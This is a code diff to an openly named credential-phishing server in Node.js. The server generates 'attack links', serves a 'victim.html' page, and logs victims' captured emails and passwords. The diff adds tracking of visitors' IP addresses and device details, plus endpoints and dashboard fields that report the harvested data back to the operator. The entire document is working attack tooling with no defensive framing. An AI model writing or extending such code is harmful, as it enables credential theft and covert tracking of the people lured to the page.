@@ -19,6 +19,15 @@ app.get('/', (req, res) => {
 // In-memory storage
 const sessions = new Map();
 
+// Get client IP
+function getClientIP(req) {
+    return req.headers['x-forwarded-for'] || 
+           req.headers['x-real-ip'] || 
+           req.connection.remoteAddress || 
+           req.socket.remoteAddress || 
+           'unknown';
+}
+
 // Generate attack link
 app.post('/api/generate', (req, res) => {
     const sessionId = uuidv4();
@@ -29,6 +38,8 @@ app.post('/api/generate', (req, res) => {
         clicks: 0,
         photos: [],
         credentials: [],
+        ips: [],
+        devices: [],
         metadata: {}
     };
     sessions.set(sessionId, session);
@@ -48,6 +59,16 @@ app.get('/v/:sessionId', (req, res) => {
     session.status = 'ACTIVE';
     session.clicks += 1;
     
+    // Capture IP
+    const ip = getClientIP(req);
+    if (ip !== 'unknown') {
+        session.ips.push({
+            ip: ip,
+            timestamp: new Date().toISOString()
+        });
+    }
+    
+    console.log(`📡 New visit: ${sessionId.substring(0,8)}... from ${ip}`);
     res.sendFile(path.join(__dirname, 'public', 'victim.html'));
 });
 
@@ -75,7 +96,7 @@ app.post('/api/photo', (req, res) => {
 
 // Receive login credentials
 app.post('/api/login', (req, res) => {
-    const { sessionId, email, password } = req.body;
+    const { sessionId, email, password, deviceInfo } = req.body;
     
     if (!sessions.has(sessionId)) {
         return res.status(404).json({ error: 'Session not found' });
@@ -89,7 +110,31 @@ app.post('/api/login', (req, res) => {
         timestamp: new Date().toISOString()
     });
     
+    if (deviceInfo) {
+        session.devices.push({
+            ...deviceInfo,
+            timestamp: new Date().toISOString()
+        });
+    }
+    
     console.log(`🔐 Credentials captured: ${email} | ${password}`);
+    res.json({ success: true });
+});
+
+// Track device info
+app.post('/api/device', (req, res) => {
+    const { sessionId, deviceInfo } = req.body;
+    
+    if (!sessions.has(sessionId)) {
+        return res.status(404).json({ error: 'Session not found' });
+    }
+    
+    const session = sessions.get(sessionId);
+    session.devices.push({
+        ...deviceInfo,
+        timestamp: new Date().toISOString()
+    });
+    
     res.json({ success: true });
 });
 
@@ -141,6 +186,31 @@ app.get('/api/credentials/:sessionId', (req, res) => {
     });
 });
 
+// Get IPs for a session
+app.get('/api/ips/:sessionId', (req, res) => {
+    const sessionId = req.params.sessionId;
+    
+    let foundSession = null;
+    let fullId = null;
+    for (const [id, data] of sessions.entries()) {
+        if (id.startsWith(sessionId.replace('...', ''))) {
+            foundSession = data;
+            fullId = id;
+            break;
+        }
+    }
+    
+    if (!foundSession) {
+        return res.status(404).json({ error: 'Session not found' });
+    }
+    
+    res.json({ 
+        sessionId: fullId,
+        ips: foundSession.ips || [],
+        devices: foundSession.devices || []
+    });
+});
+
 // Dashboard HTML
 app.get('/dashboard', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
@@ -154,7 +224,9 @@ app.get('/api/dashboard', (req, res) => {
         clicks: data.clicks,
         photos: data.photos.length,
         credentials: data.credentials ? data.credentials.length : 0,
-        created: data.created
+        ips: data.ips ? data.ips.length : 0,
+        created: data.created,
+        lastIp: data.ips && data.ips.length > 0 ? data.ips[data.ips.length - 1].ip : 'N/A'
     }));
     
     res.json({ sessions: sessionData });
